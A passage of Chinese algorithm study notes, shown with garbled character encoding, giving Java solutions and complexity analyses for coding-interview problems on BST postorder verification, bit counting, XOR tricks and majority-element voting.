é¢˜ç›®\n\n>è¾“å…¥ä¸€ä¸ªæ•´æ•°æ•°ç»„ï¼Œåˆ¤æ–­è¯¥æ•°ç»„æ˜¯ä¸æ˜¯æŸäºŒå‰æœç´¢æ ‘çš„ååºéå†ç»“æœã€‚å¦‚æœæ˜¯åˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚å‡è®¾è¾“å…¥çš„æ•°ç»„çš„ä»»æ„ä¸¤ä¸ªæ•°å­—éƒ½äº’ä¸ç›¸åŒã€‚\n>\n>å‚è€ƒä»¥ä¸‹è¿™é¢—äºŒå‰æœç´¢æ ‘ï¼š\n>\n>         5\n>        / \\\n>       2   6\n>      / \\\n>     1   3\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥: [1,6,3,2,5]\n>è¾“å‡º: false\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥: [1,3,2,6,5]\n>è¾“å‡º: true\n>```\n\n### è§£ç­”\n\n- **ååºéå†å®šä¹‰ï¼š** `[ å·¦å­æ ‘ | å³å­æ ‘ | æ ¹èŠ‚ç‚¹ ]` ï¼Œå³éå†é¡ºåºä¸º â€œå·¦ã€å³ã€æ ¹â€ ã€‚\n\n![](https://img.jwt1399.top/img/202209012207166.png)\n\n##### é€’å½’è§£æï¼š\n\n-   **ç»ˆæ­¢æ¡ä»¶ï¼š** å½“ left â‰¥ rightï¼Œè¯´æ˜æ­¤å­æ ‘èŠ‚ç‚¹æ•°é‡ â‰¤ 1 ï¼Œæ— éœ€åˆ¤åˆ«æ­£ç¡®æ€§ï¼Œå› æ­¤ç›´æ¥è¿”å› trueï¼›\n-   **é€’æ¨å·¥ä½œï¼š**\n    \n    1. **åˆ’åˆ†å·¦å³å­æ ‘ï¼š** éå†ååºéå†çš„ \\[left,right] åŒºé—´å…ƒç´ ï¼Œå¯»æ‰¾ **ç¬¬ä¸€ä¸ªå¤§äºæ ¹èŠ‚ç‚¹** çš„èŠ‚ç‚¹ï¼Œç´¢å¼•è®°ä¸º m ã€‚\n    \n       -   æ­¤æ—¶ï¼Œå¯åˆ’åˆ†å‡ºå·¦å­æ ‘åŒºé—´ \\[left,mâˆ’1] \n    -   å³å­æ ‘åŒºé—´ \\[m,rightâˆ’1]\n       -   æ ¹èŠ‚ç‚¹ç´¢å¼• right \n    \n    2. **åˆ¤æ–­æ˜¯å¦ä¸ºäºŒå‰æœç´¢æ ‘ï¼š**\n    \n       -   **å·¦å­æ ‘åŒºé—´** [left,mâˆ’1] å†…çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½åº” < postorder\\[right\\]ã€‚\n       -   **å³å­æ ‘åŒºé—´** [m,rightâˆ’1\\] å†…çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½åº” > postorder\\[right\\] ã€‚\n-   **è¿”å›å€¼ï¼š** æ‰€æœ‰å­æ ‘éƒ½éœ€æ­£ç¡®æ‰å¯åˆ¤å®šæ­£ç¡®ï¼Œå› æ­¤ä½¿ç”¨ **ä¸é€»è¾‘ç¬¦** && è¿æ¥ã€‚\n    1.  **p = right ï¼š** åˆ¤æ–­ **æ­¤æ ‘** æ˜¯å¦æ­£ç¡®ã€‚\n    2.  **recur(left,mâˆ’1) ï¼š** åˆ¤æ–­ **æ­¤æ ‘çš„å·¦å­æ ‘** æ˜¯å¦æ­£ç¡®ã€‚\n    3.  **recur(m,rightâˆ’1)ï¼š** åˆ¤æ–­ **æ­¤æ ‘çš„å³å­æ ‘** æ˜¯å¦æ­£ç¡®ã€‚\n\n```java\nclass Solution {\n    public boolean verifyPostorder(int[] postorder) {\n        return recur(postorder, 0, postorder.length - 1);\n    }\n    boolean recur(int[] postorder, int left, int right) {\n        if(left >= right) return true;\n        int rootValue = postorder[right]; // æ ¹èŠ‚ç‚¹çš„å€¼\n        int p = left;\n        while(postorder[p] < rootValue) p++; //å·¦å­æ ‘\n        int m = p;\n        while(postorder[p] > rootValue) p++; //å³å­æ ‘\n        return p == right && recur(postorder, left, m - 1) && recur(postorder, m, right - 1);\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N<sup>2</sup>) ï¼š** æ¯æ¬¡è°ƒç”¨ recur(left,right) å‡å»ä¸€ä¸ªæ ¹èŠ‚ç‚¹ï¼Œå› æ­¤é€’å½’å ç”¨ O(N) ï¼›æœ€å·®æƒ…å†µä¸‹ï¼ˆå³å½“æ ‘é€€åŒ–ä¸ºé“¾è¡¨ï¼‰ï¼Œæ¯è½®é€’å½’éƒ½éœ€éå†æ ‘æ‰€æœ‰èŠ‚ç‚¹ï¼Œå ç”¨ O(N) ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(N) ï¼š** æœ€å·®æƒ…å†µä¸‹ï¼ˆå³å½“æ ‘é€€åŒ–ä¸ºé“¾è¡¨ï¼‰ï¼Œé€’å½’æ·±åº¦å°†è¾¾åˆ° N ã€‚\n\n# ç¬¬ 21 å¤© ä½è¿ç®—ï¼ˆç®€å•ï¼‰\n\n## 15. äºŒè¿›åˆ¶ä¸­1çš„ä¸ªæ•°\n\n### é¢˜ç›®\n\n>ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œè¾“å…¥æ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•´æ•°ï¼ˆä»¥äºŒè¿›åˆ¶ä¸²çš„å½¢å¼ï¼‰ï¼Œè¿”å›å…¶äºŒè¿›åˆ¶è¡¨è¾¾å¼ä¸­æ•°å­—ä½æ•°ä¸º '1' çš„ä¸ªæ•°ï¼ˆä¹Ÿè¢«ç§°ä¸ºæ±‰æ˜é‡é‡)ã€‚\n>\n>æç¤ºï¼š\n>\n>è¯·æ³¨æ„ï¼Œåœ¨æŸäº›è¯­è¨€ï¼ˆå¦‚ Javaï¼‰ä¸­ï¼Œæ²¡æœ‰æ— ç¬¦å·æ•´æ•°ç±»å‹ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¾“å…¥å’Œè¾“å‡ºéƒ½å°†è¢«æŒ‡å®šä¸ºæœ‰ç¬¦å·æ•´æ•°ç±»å‹ï¼Œå¹¶ä¸”ä¸åº”å½±å“æ‚¨çš„å®ç°ï¼Œå› ä¸ºæ— è®ºæ•´æ•°æ˜¯æœ‰ç¬¦å·çš„è¿˜æ˜¯æ— ç¬¦å·çš„ï¼Œå…¶å†…éƒ¨çš„äºŒè¿›åˆ¶è¡¨ç¤ºå½¢å¼éƒ½æ˜¯ç›¸åŒçš„ã€‚\n>åœ¨ Java ä¸­ï¼Œç¼–è¯‘å™¨ä½¿ç”¨ äºŒè¿›åˆ¶è¡¥ç  è®°æ³•æ¥è¡¨ç¤ºæœ‰ç¬¦å·æ•´æ•°ã€‚å› æ­¤ï¼Œåœ¨ä¸Šé¢çš„ ç¤ºä¾‹ 3 ä¸­ï¼Œè¾“å…¥è¡¨ç¤ºæœ‰ç¬¦å·æ•´æ•° -3ã€‚\n>\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼šn = 11 (æ§åˆ¶å°è¾“å…¥ 00000000000000000000000000001011)\n>è¾“å‡ºï¼š3\n>è§£é‡Šï¼šè¾“å…¥çš„äºŒè¿›åˆ¶ä¸² 00000000000000000000000000001011 ä¸­ï¼Œå…±æœ‰ä¸‰ä½ä¸º '1'ã€‚\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥ï¼šn = 128 (æ§åˆ¶å°è¾“å…¥ 00000000000000000000000010000000)\n>è¾“å‡ºï¼š1\n>è§£é‡Šï¼šè¾“å…¥çš„äºŒè¿›åˆ¶ä¸² 00000000000000000000000010000000 ä¸­ï¼Œå…±æœ‰ä¸€ä½ä¸º '1'ã€‚\n>```\n>\n>ç¤ºä¾‹ 3ï¼š\n>\n>```\n>è¾“å…¥ï¼šn = 4294967293 (æ§åˆ¶å°è¾“å…¥ 11111111111111111111111111111101ï¼Œéƒ¨åˆ†è¯­è¨€ä¸­ n = -3ï¼‰\n>è¾“å‡ºï¼š31\n>è§£é‡Šï¼šè¾“å…¥çš„äºŒè¿›åˆ¶ä¸² 11111111111111111111111111111101 ä¸­ï¼Œå…±æœ‰ 31 ä½ä¸º '1'ã€‚\n>```\n\n### è§£ç­”\n\n#### æ–¹æ³•1ï¼šè°ƒç”¨API\n\n```java\npublic class Solution {\n    // you need to treat n as an unsigned value\n    public int hammingWeight(int n) {\n        return Integer.bitCount(n);\n    }\n}\n```\n\n#### æ–¹æ³•2ï¼š**é€ä½åˆ¤æ–­**\n\n-   æ ¹æ® **ä¸è¿ç®—** å®šä¹‰ï¼Œè®¾äºŒè¿›åˆ¶æ•°å­— n ï¼Œåˆ™æœ‰ï¼š\n    -   è‹¥ n&1\\=0 ï¼Œåˆ™ n äºŒè¿›åˆ¶ **æœ€å³ä¸€ä½** ä¸º 0 ï¼›\n    -   è‹¥ n&1\\=1ï¼Œåˆ™ n äºŒè¿›åˆ¶ **æœ€å³ä¸€ä½** ä¸º 1 ã€‚\n-   æ ¹æ®ä»¥ä¸Šç‰¹ç‚¹ï¼Œè€ƒè™‘ä»¥ä¸‹ **å¾ªç¯åˆ¤æ–­** ï¼š\n    1.  åˆ¤æ–­ n æœ€å³ä¸€ä½æ˜¯å¦ä¸º 1 ï¼Œæ ¹æ®ç»“æœè®¡æ•°ã€‚\n    2.  å°† n å³ç§»ä¸€ä½ï¼ˆæœ¬é¢˜è¦æ±‚æŠŠæ•°å­— n çœ‹ä½œæ— ç¬¦å·æ•°ï¼Œå› æ­¤ä½¿ç”¨ **æ— ç¬¦å·å³ç§»**(>>>) æ“ä½œï¼‰ã€‚\n\n```java\npublic class Solution {\n    public int hammingWeight(int n) {\n        int res = 0;\n        while(n != 0){\n            if((n&1) == 1) \n                res++;\n            n = n>>>1;\n        }\n        return res;\n    }\n}\n\n//ä¼˜åŒ–\npublic class Solution {\n    public int hammingWeight(int n) {\n        int res = 0;\n        while(n != 0) {\n            res += n & 1;\n            n >>>= 1;\n        }\n        return res;\n    }\n}\n```\n\n#### æ–¹æ³•3ï¼š**å·§ç”¨** n \\& (n - 1)\n\n-   **(nâˆ’1) è§£æï¼š** äºŒè¿›åˆ¶æ•°å­— n æœ€å³è¾¹çš„ 1 å˜æˆ 0 ï¼Œæ­¤ 1 å³è¾¹çš„ 0 éƒ½å˜æˆ 1 ã€‚\n-   **n&(nâˆ’1) è§£æï¼š** äºŒè¿›åˆ¶æ•°å­— n æœ€å³è¾¹çš„ 1 å˜æˆ 0 ï¼Œå…¶ä½™ä¸å˜ã€‚å³æ¶ˆå»æœ€å³è¾¹ 1\n\n![](https://img.jwt1399.top/img/202209021306142.png)\n\n```java\npublic class Solution {\n    public int hammingWeight(int n) {\n        int res = 0;\n        while(n != 0) {\n            res++;\n            n &= n - 1;\n        }\n        return res;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n#### æ–¹æ³•2\n\n-   **æ—¶é—´å¤æ‚åº¦ O(log<sub>2</sub>n)ï¼š** æ­¤ç®—æ³•å¾ªç¯å†…éƒ¨ä»…æœ‰ **ç§»ä½ã€ä¸ã€åŠ ** ç­‰åŸºæœ¬è¿ç®—ï¼Œå ç”¨ O(1) ï¼›é€ä½åˆ¤æ–­éœ€å¾ªç¯ log<sub>2</sub>n æ¬¡ï¼Œå…¶ä¸­ log<sub>2</sub>n ä»£è¡¨æ•°å­— n æœ€é«˜ä½ 1 çš„æ‰€åœ¨ä½æ•°ï¼ˆä¾‹å¦‚ log<sub>2</sub>4\\=2, log<sub>2</sub>16=4ï¼‰ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** å˜é‡ res ä½¿ç”¨å¸¸æ•°å¤§å°é¢å¤–ç©ºé—´ã€‚\n\n#### æ–¹æ³•3\n\n-   **æ—¶é—´å¤æ‚åº¦ O(M) ï¼š** å¾ªç¯å†…éƒ¨ä»…æœ‰å‡æ³•ã€åŠ ã€ä¸è¿ç®—ï¼Œå ç”¨ O(1) ï¼›è®¾ M ä¸ºäºŒè¿›åˆ¶æ•°å­— n ä¸­ 1 çš„ä¸ªæ•°ï¼Œåˆ™éœ€å¾ªç¯ M æ¬¡ï¼ˆæ¯è½®æ¶ˆå»ä¸€ä¸ª 1 ï¼‰ï¼Œå ç”¨ O(M) ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** å˜é‡ res ä½¿ç”¨å¸¸æ•°å¤§å°é¢å¤–ç©ºé—´ã€‚\n\n## 65. ä¸ç”¨åŠ å‡ä¹˜é™¤åšåŠ æ³•\n\n### é¢˜ç›®\n\n>å†™ä¸€ä¸ªå‡½æ•°ï¼Œæ±‚ä¸¤ä¸ªæ•´æ•°ä¹‹å’Œï¼Œè¦æ±‚åœ¨å‡½æ•°ä½“å†…ä¸å¾—ä½¿ç”¨ â€œ+â€ã€â€œ-â€ã€â€œ*â€ã€â€œ/â€ å››åˆ™è¿ç®—ç¬¦å·ã€‚\n>\n>ç¤ºä¾‹:\n>\n>```\n>è¾“å…¥: a = 1, b = 1\n>è¾“å‡º: 2\n>```\n\n### è§£ç­”\n\n![](https://img.jwt1399.top/img/202209021331863.png)\n\nå› ä¸ºä¸èƒ½ä½¿ç”¨â€œ+â€ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ n + c ï¼Œæ‰€ä»¥å¾ªç¯æ±‚ n å’Œ cï¼Œç›´è‡³è¿›ä½ c = 0ï¼›æ­¤æ—¶ s = n ï¼Œè¿”å› n å³å¯ã€‚\n\n```java\nclass Solution {\n    public int add(int a, int b) {\n        while(b != 0) { // å½“è¿›ä½ä¸º 0 æ—¶è·³å‡º\n            int c = (a & b) << 1;  // c = è¿›ä½\n            int n = a ^ b; // n = éè¿›ä½å’Œ\n             a = n;  // a = éè¿›ä½å’Œ\n             b = c; // b = è¿›ä½\n        }\n        return a;\n    }\n}\n\n//ä¼˜åŒ–\nclass Solution {\n    public int add(int a, int b) {\n        while(b != 0) { // å½“è¿›ä½ä¸º 0 æ—¶è·³å‡º\n            int c = (a & b) << 1;  // c = è¿›ä½\n            a ^= b; // a = éè¿›ä½å’Œ\n            b = c; // b = è¿›ä½\n        }\n        return a;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(1) ï¼š** æœ€å·®æƒ…å†µä¸‹ï¼ˆä¾‹å¦‚ a\\= 0x7fffffff , b\\=1 æ—¶ï¼‰ï¼Œéœ€å¾ªç¯ 32 æ¬¡ï¼Œä½¿ç”¨ O(1) æ—¶é—´ï¼›æ¯è½®ä¸­çš„å¸¸æ•°æ¬¡ä½æ“ä½œä½¿ç”¨ O(1) æ—¶é—´ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** ä½¿ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n# ç¬¬ 22 å¤© ä½è¿ç®—ï¼ˆä¸­ç­‰ï¼‰\n\n## 56 - I. æ•°ç»„ä¸­æ•°å­—å‡ºç°çš„æ¬¡æ•°\n\n### é¢˜ç›®\n\n>ä¸€ä¸ªæ•´å‹æ•°ç»„ nums é‡Œé™¤ä¸¤ä¸ªæ•°å­—ä¹‹å¤–ï¼Œå…¶ä»–æ•°å­—éƒ½å‡ºç°äº†ä¸¤æ¬¡ã€‚è¯·å†™ç¨‹åºæ‰¾å‡ºè¿™ä¸¤ä¸ªåªå‡ºç°ä¸€æ¬¡çš„æ•°å­—ã€‚è¦æ±‚æ—¶é—´å¤æ‚åº¦æ˜¯O(n)ï¼Œç©ºé—´å¤æ‚åº¦æ˜¯O(1)ã€‚\n>\n> ç¤ºä¾‹ 1ï¼š\n>\n>è¾“å…¥ï¼šnums = [4,1,4,6]\n>è¾“å‡ºï¼š[1,6] æˆ– [6,1]\n>ç¤ºä¾‹ 2ï¼š\n>\n>è¾“å…¥ï¼šnums = [1,2,10,4,1,4,3,3]\n>è¾“å‡ºï¼š[2,10] æˆ– [10,2]\n\n### è§£ç­”\n\nå¦‚æœé—®é¢˜æ˜¯ï¼šä¸€ä¸ªæ•´å‹æ•°ç»„ nums é‡Œ**æœ‰ä¸€ä¸ª**åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—ï¼Œå…¶ä»–æ•°å­—éƒ½å‡ºç°äº†ä¸¤æ¬¡ã€‚é‚£ä¹ˆå¯ä»¥å¾ˆå®¹æ˜“æ±‚å‡ºè¿™ä¸ªæ•°å­—\n\n```\naâŠ•aâŠ•bâŠ•bâŠ•...âŠ•x\n=0âŠ•0âŠ•...âŠ•x\n=x\n```\n```java\npublic int[] singleNumber(int[] nums) {\n    int x = 0;\n    for(int num : nums)  // 1. éå† nums æ‰§è¡Œå¼‚æˆ–è¿ç®—\n        x ^= num;\n    return x;            // 2. è¿”å›å‡ºç°ä¸€æ¬¡çš„æ•°å­— x\n}\n```\n\næœ¬é¢˜éš¾ç‚¹ï¼š æ•°ç»„ nums **æœ‰ä¸¤ä¸ª**åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—ï¼Œå› æ­¤æ— æ³•é€šè¿‡å¼‚æˆ–ç›´æ¥å¾—åˆ°è¿™ä¸¤ä¸ªæ•°å­—ã€‚\n\nè§£å†³æ€è·¯æ˜¯å°†ä¸¤ä¸ªæ•°å­—æ‹†åˆ†åˆ°ä¸¤ä¸ªå­æ•°ç»„ä¸­ï¼Œå†åˆ†åˆ«éå†ä¸¤ä¸ªå­æ•°ç»„æ‰§è¡Œå¼‚æˆ–\n\nè®¾ä¸¤ä¸ªåªå‡ºç°ä¸€æ¬¡çš„æ•°å­—ä¸º x , y ï¼Œç”±äº x â‰  yï¼Œåˆ™ x å’Œ y äºŒè¿›åˆ¶è‡³å°‘æœ‰ä¸€ä½ä¸åŒï¼ˆå³åˆ†åˆ«ä¸º 0 å’Œ 1 ï¼‰ï¼Œæ ¹æ®æ­¤ä½å¯ä»¥å°† nums æ‹†åˆ†ä¸ºåˆ†åˆ«åŒ…å« x å’Œ y çš„ä¸¤ä¸ªå­æ•°ç»„ã€‚\n\n```\naâŠ•aâŠ•bâŠ•bâŠ•...âŠ•xâŠ•y  \n=0âŠ•0âŠ•...âŠ•xâŠ•y\n=xâŠ•y\n```\n\næ ¹æ®å¼‚æˆ–è¿ç®—å®šä¹‰ï¼Œè‹¥æ•´æ•° xâŠ•y æŸäºŒè¿›åˆ¶ä½ä¸º 1 ï¼Œåˆ™ x å’Œ y çš„æ­¤äºŒè¿›åˆ¶ä½ä¸€å®šä¸åŒã€‚æ¢è¨€ä¹‹ï¼Œæ‰¾åˆ° xâŠ•y æŸä½ä¸º 1 çš„äºŒè¿›åˆ¶ä½ mï¼Œå³å¯å°†æ•°ç»„ nums æ‹†åˆ†ä¸ºåŒ…å« x å’Œ y çš„ä¸¤ä¸ªå­æ•°ç»„ã€‚\n\n- è‹¥ (xâŠ•y) \\& 0001 = 1 ï¼Œåˆ™ xâŠ•y çš„å³è¾¹ç¬¬ä¸€ä½ä¸º 1 ï¼›\n- è‹¥ (xâŠ•y) \\& 0010 = 1ï¼Œåˆ™ xâŠ•y çš„å³è¾¹ç¬¬äºŒä½ä¸º 1 ï¼›\n- ä»¥æ­¤ç±»æ¨â€¦â€¦\n\n![](https://img.jwt1399.top/img/202209031340951.png)\n\n```java\nclass Solution {\n    public int[] singleNumbers(int[] nums) {\n      int n = 0, m = 1, x = 0, y = 0;\n      for(int num : nums)\n        n ^= num;\n      while((n & m) == 0)\n        m <<= 1;\n      for(int num : nums)\n        if((num & m) == 0)\n          x ^= num;\n        else y ^= num;\n      return new int[]{x,y};\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** çº¿æ€§éå† nums ä½¿ç”¨ O(N) æ—¶é—´ï¼Œéå† xâŠ•y äºŒè¿›åˆ¶ä½ä½¿ç”¨ O(32)\\=O(1) æ—¶é—´ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** è¾…åŠ©å˜é‡ n , m , x , y ä½¿ç”¨å¸¸æ•°å¤§å°é¢å¤–ç©ºé—´ã€‚\n\n## 56 - II. æ•°ç»„ä¸­æ•°å­—å‡ºç°çš„æ¬¡æ•° II\n\n### é¢˜ç›®\n\n>åœ¨ä¸€ä¸ªæ•°ç»„ nums ä¸­é™¤ä¸€ä¸ªæ•°å­—åªå‡ºç°ä¸€æ¬¡ä¹‹å¤–ï¼Œå…¶ä»–æ•°å­—éƒ½å‡ºç°äº†ä¸‰æ¬¡ã€‚è¯·æ‰¾å‡ºé‚£ä¸ªåªå‡ºç°ä¸€æ¬¡çš„æ•°å­—ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼šnums = [3,4,3,3]\n>è¾“å‡ºï¼š4\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥ï¼šnums = [9,1,7,9,7,9,7]\n>è¾“å‡ºï¼š1\n>```\n\n### è§£ç­”\n\n#### æ–¹æ³•1ï¼šå“ˆå¸Œè¡¨\n\n```java\nclass Solution {\n    public int singleNumber(int[] nums) {\n        Map<Integer, Integer> map = new HashMap<>();\n        // åŠ å…¥å“ˆå¸Œè¡¨\n        for(int i = 0; i < nums.length; i++) {\n            map.put(nums[i], map.getOrDefault(nums[i], 0) + 1);\n        }\n        // éå†æ‰¾å‡ºç¬¬ä¸€ä¸ªæ¬¡æ•°ä¸º1çš„æ•°\n        for(int i = 0; i < nums.length; i++) {\n            if(map.get(nums[i]) == 1) {\n                return nums[i];\n            }\n        }\n        return -1;\n    }\n}\n```\n\n#### æ–¹æ³•2ï¼šä½è¿ç®—\n\n![](https://img.jwt1399.top/img/202209031429884.png)\n\nä½¿ç”¨ **ä¸è¿ç®—** ï¼Œå¯è·å–äºŒè¿›åˆ¶æ•°å­— num çš„æœ€å³ä¸€ä½ n1 ï¼š\n\nn1\\=num&i\n\né…åˆ **æ— ç¬¦å·å³ç§»æ“ä½œ** ï¼Œå¯è·å– num æ‰€æœ‰ä½çš„å€¼ï¼ˆå³ n1 ~ n32ï¼‰ï¼š\n\nnum\\=num\\>\\>\\>1\n\nå»ºç«‹ä¸€ä¸ªé•¿åº¦ä¸º 32 çš„æ•°ç»„ counts ï¼Œé€šè¿‡ä»¥ä¸Šæ–¹æ³•å¯è®°å½•æ‰€æœ‰æ•°å­—çš„å„äºŒè¿›åˆ¶ä½çš„ 1 çš„å‡ºç°æ¬¡æ•°ã€‚\n\n```java\nint[] counts = new int[32];\nfor(int i = 0; i < nums.length; i++) {\n    for(int j = 0; j < 32; j++) {\n        counts[j] += nums[i] & 1; // æ›´æ–°ç¬¬ j ä½\n        nums[i] >>>= 1; // ç¬¬ j ä½ --> ç¬¬ j + 1 ä½\n    }\n}\n\n```\n\nå°† counts å„å…ƒç´ å¯¹ 3 æ±‚ä½™ï¼Œåˆ™ç»“æœä¸º â€œåªå‡ºç°ä¸€æ¬¡çš„æ•°å­—â€ çš„å„äºŒè¿›åˆ¶ä½ã€‚\n\n```java\nfor(int i = 0; i < 32; i++) {\n    counts[i] %= 3; // å¾—åˆ° åªå‡ºç°ä¸€æ¬¡çš„æ•°å­— çš„ç¬¬ (31 - i) ä½ \n}\n```\n\nåˆ©ç”¨ **å·¦ç§»æ“ä½œ** å’Œ **æˆ–è¿ç®—** ï¼Œå¯å°† counts æ•°ç»„ä¸­å„äºŒè¿›ä½çš„å€¼æ¢å¤åˆ°æ•°å­— res ä¸Šï¼ˆå¾ªç¯åŒºé—´æ˜¯ iâˆˆ\\[0,31\\]ï¼‰ã€‚\n\n```java\nfor(int i = 0; i < counts.length; i++) {\n    res <<= 1; // å·¦ç§» 1 ä½\n    res |= counts[31 - i]; // æ¢å¤ç¬¬ i ä½çš„å€¼åˆ° res\n}\n```\n\næœ€ç»ˆè¿”å› res å³å¯ã€‚\n\n```java\nclass Solution {\n    public int singleNumber(int[] nums) {\n        int[] counts = new int[32];\n        for(int num : nums) {\n            for(int j = 0; j < 32; j++) {\n                counts[j] += num & 1;\n                num >>>= 1;\n            }\n        }\n        int res = 0, m = 3;\n        for(int i = 0; i < 32; i++) {\n            res <<= 1;\n            res |= counts[31 - i] % m;\n        }\n        return res;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n#### æ–¹æ³•1\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** å…¶ä¸­ N ä¸ºæ•°ç»„ nums çš„é•¿åº¦ï¼›éå†æ•°ç»„å ç”¨ O(N) \n-   **ç©ºé—´å¤æ‚åº¦ O(N) ï¼š**  HashMap ä½¿ç”¨ O(N) é¢å¤–ç©ºé—´\n\n#### æ–¹æ³•2\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** å…¶ä¸­ NNN ä½æ•°ç»„ nums çš„é•¿åº¦ï¼›éå†æ•°ç»„å ç”¨ O(N) ï¼Œæ¯è½®ä¸­çš„å¸¸æ•°ä¸ªä½è¿ç®—æ“ä½œå ç”¨ O(1) ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** æ•°ç»„ counts é•¿åº¦æ’ä¸º 32 ï¼Œå ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n# ç¬¬ 23 å¤© æ•°å­¦ï¼ˆç®€å•ï¼‰\n\n## 39. æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°è¶…è¿‡ä¸€åŠçš„\n\n### é¢˜ç›®\n\n>æ•°ç»„ä¸­æœ‰ä¸€ä¸ªæ•°å­—å‡ºç°çš„æ¬¡æ•°è¶…è¿‡æ•°ç»„é•¿åº¦çš„ä¸€åŠï¼Œè¯·æ‰¾å‡ºè¿™ä¸ªæ•°å­—ã€‚\n>\n>ä½ å¯ä»¥å‡è®¾æ•°ç»„æ˜¯éç©ºçš„ï¼Œå¹¶ä¸”ç»™å®šçš„æ•°ç»„æ€»æ˜¯å­˜åœ¨å¤šæ•°å…ƒç´ ã€‚\n>\n>ç¤ºä¾‹ 1:\n>\n>```\n>è¾“å…¥: [1, 2, 3, 2, 2, 2, 5, 4, 2]\n>è¾“å‡º: 2\n>```\n\n### è§£ç­”\n\n#### æ–¹æ³•1ï¼šå“ˆå¸Œè¡¨\n\n```java\nclass Solution {\n    public int majorityElement(int[] nums) {\n        Map<Integer, Integer> map = new HashMap<>();\n        for(int i = 0; i < nums.length; i++){\n            map.put(nums[i], map.getOrDefault(nums[i], 0) + 1);\n        }\n        for(int i = 0; i < nums.length; i++){\n            if(map.get(nums[i]) > (nums.length/2)){\n                return nums[i];\n            }      \n        }\n        return 0;\n    }\n}\n\n//ä¼˜åŒ–\nclass Solution {\n    public int majorityElement(int[] nums) {\n        Map<Integer, Integer> map = new HashMap<>();\n        for(int num : nums){\n            map.put(num, map.getOrDefault(num, 0) + 1);\n            if(map.get(num) > nums.length/2) \n                return num;\n        }\n        return 0;\n    }\n}\n\n```\n\n#### æ–¹æ³•2ï¼šæ’åº\n\næ‰€æ±‚çš„æ•°å­—å‡ºç°æ¬¡æ•°å¤šäºä¸€åŠï¼Œé‚£ä¹ˆæ’åºåå¿…å®šåœ¨ä¸­é—´\n\n```java\nclass Solution {\n    public int majorityElement(int[] nums) {\n        Arrays.sort(nums);\n        return nums[nums.length/2];\n    }\n}\n```\n\n#### æ–¹æ³•3ï¼šæ‘©å°”æŠ•ç¥¨æ³•\n\næ ¸å¿ƒç†å¿µä¸º **ç¥¨æ•°æ­£è´ŸæŠµæ¶ˆ**ï¼Œè®¾è¾“å…¥æ•°ç»„ nums çš„ä¼—æ•°ä¸º x ï¼Œæ•°ç»„é•¿åº¦ä¸º n ã€‚\n\n- æ¨è®ºä¸€ï¼š è‹¥è®° ä¼—æ•° çš„ç¥¨æ•°ä¸º +1 ï¼Œéä¼—æ•° çš„ç¥¨æ•°ä¸º âˆ’1 ï¼Œåˆ™ä¸€å®šæœ‰æ‰€æœ‰æ•°å­—çš„ç¥¨æ•°å’Œ > 0 \n\n- æ¨è®ºäºŒï¼š è‹¥æ•°ç»„çš„å‰ a ä¸ªæ•°å­—çš„ ç¥¨æ•°å’Œ =0 ï¼Œåˆ™ æ•°ç»„å‰©ä½™ (n-a) ä¸ªæ•°å­—çš„ ç¥¨æ•°å’Œä¸€å®šä» >0 ï¼Œå³å (n-a) ä¸ªæ•°å­—çš„ä¼—æ•°ä»ä¸º x \n\n![](https://img.jwt1399.top/img/202209041206429.png)\n\n##### ç®—æ³•æµç¨‹:\n\n1.  **åˆå§‹åŒ–ï¼š** ç¥¨æ•°ç»Ÿè®¡ `votes = 0` ï¼Œ ä¼—æ•° `x = 0`ï¼›\n2.  **å¾ªç¯ï¼š** éå†æ•°ç»„ `nums` ä¸­çš„æ¯ä¸ªæ•°å­— `num` ï¼›\n    1.  å½“ ç¥¨æ•° `votes` ç­‰äº 0 ï¼Œåˆ™å‡è®¾å½“å‰æ•°å­— `num` æ˜¯ä¼—æ•°ï¼›\n    2.  å½“ `num = x` æ—¶ï¼Œç¥¨æ•° `votes` è‡ªå¢ 1 ï¼›å½“ `num != x` æ—¶ï¼Œç¥¨æ•° `votes` è‡ªå‡ 1 ï¼›\n3.  **è¿”å›å€¼ï¼š** è¿”å› `x` å³å¯ï¼›\n\n```java\nclass Solution {\n    public int majorityElement(int[] nums) {\n      int votes = 0, x = 0;\n      for(int num : nums){\n        if(votes == 0) x = num;\n        if(num == x) votes++;\n        else votes--;\n      }\n      return x;\n    }\n}\n\n//ä¼˜åŒ–\nclass Solution {\n    public int majorityElement(int[] nums) {\n        int x = 